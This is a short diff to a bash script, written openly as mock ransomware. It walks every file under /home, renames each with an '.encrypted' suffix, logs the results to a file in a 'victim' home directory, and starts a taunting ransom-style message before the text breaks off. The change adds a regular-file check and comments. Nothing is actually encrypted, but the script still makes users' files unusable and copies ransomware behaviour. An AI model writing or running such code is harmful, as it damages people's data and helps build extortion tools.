@@ -1,14 +1,16 @@
-#/bin/sh
+#/bin/bash
 
-shopt -s globstar
+shopt -s globstar  # Enable recursive globbing
 
+# Loop through all files and directories in /home and its subdirectories
 for file in /home/**/*; do
-    if mv "$file" "${file}.encrypted"; then
-        echo "Encrypted: $file" >> "/home/victim/encryption_log.txt"
-    else
-        echo "Failed to encrypt: $file" >> "/home/victim/encryption_log.txt"
+    if [ -f "$file" ]; then  # Check if it's a file (not a directory)
+        if mv "$file" "${file}.encrypted"; then
+            echo "Encrypted: $file" >> "/home/victim/encryption_log.txt"
+        else
+            echo "Failed to encrypt: $file" >> "/home/victim/encryption_log.txt"
+        fi
     fi
-
 done
 
 echo "Hello there, my unfortunate friend.\n\
